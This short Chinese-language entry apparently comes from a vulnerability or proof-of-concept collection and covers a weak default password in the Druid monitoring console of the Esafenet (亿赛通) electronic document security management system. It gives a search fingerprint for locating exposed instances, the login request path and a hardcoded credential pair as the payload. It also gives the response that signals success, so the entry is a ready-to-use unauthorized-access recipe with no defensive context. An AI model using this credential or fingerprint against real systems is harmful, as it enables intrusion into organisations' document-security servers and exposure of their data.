# 亿赛通druid-weakpassword漏洞

亿赛通druid-weakpassword ｜ 其他 ｜ —
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/druid/submitLogin HTTP/1.1`

**Payload**
```
loginUsername=druid&loginPassword=EstNet.Druid
```
- **响应特征**：200 success